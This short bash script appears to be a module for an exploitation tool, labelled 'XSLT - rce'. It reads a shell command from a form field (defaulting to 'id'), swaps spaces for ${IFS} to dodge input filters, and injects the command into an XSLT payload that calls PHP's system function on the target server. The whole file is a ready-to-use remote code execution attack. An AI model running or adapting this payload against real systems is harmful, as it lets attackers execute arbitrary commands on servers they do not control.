#!/bin/bash

: '
XSLT - rce
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
CMD_FIELD=$(form_item "execute cmd" "cmd" "id")

# Generate GUI form
generate_form "${CMD_FIELD}"

CMD=${form_data["cmd"]}

execute_command "<xsl:value-of select=\"php:function('system','${CMD// /\$\{IFS\}}')\" />"
